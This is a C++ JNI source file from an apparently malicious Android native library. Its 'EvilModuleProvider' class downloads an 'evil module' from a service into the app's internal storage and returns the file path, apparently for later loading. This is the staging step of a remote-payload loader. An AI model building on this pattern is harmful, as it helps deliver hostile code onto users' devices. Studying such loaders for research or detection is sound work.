#include <jni.h>
#include "EvilModuleProvider.h"
#include "Util.h"
#include "Downloader.h"

using namespace std;
using namespace util;

#define LOG_TAG "EVIL_LIB::EVILMODULEPROVIDER"

EvilModuleProvider::EvilModuleProvider(Service service) : service(service) {}

EvilModuleProvider::~EvilModuleProvider() {}


std::string EvilModuleProvider::provideEvilModuleFilePath() throw(NoSuchFileException) {
    if (!fileDownloaded) {
        throw NoSuchFileException("File wasn't successfully downloaded before.");
    }
    return filePath;
}

std::string EvilModuleProvider::downloadEvilModule(JNIEnv *env, const char* fileName) throw(DownloadException) {
    fileDownloaded = false;
    string internalStorage = util::getInternalStorageDir(env);
    string filePath = internalStorage + "/" + fileName;

    std::remove(filePath.c_str());


    try{
        Downloader downloader(service, filePath);
        downloader.download();
    } catch (DownloadException e) {
        throw e;
    }

    fileDownloaded = true;

    return std::move(filePath);
}
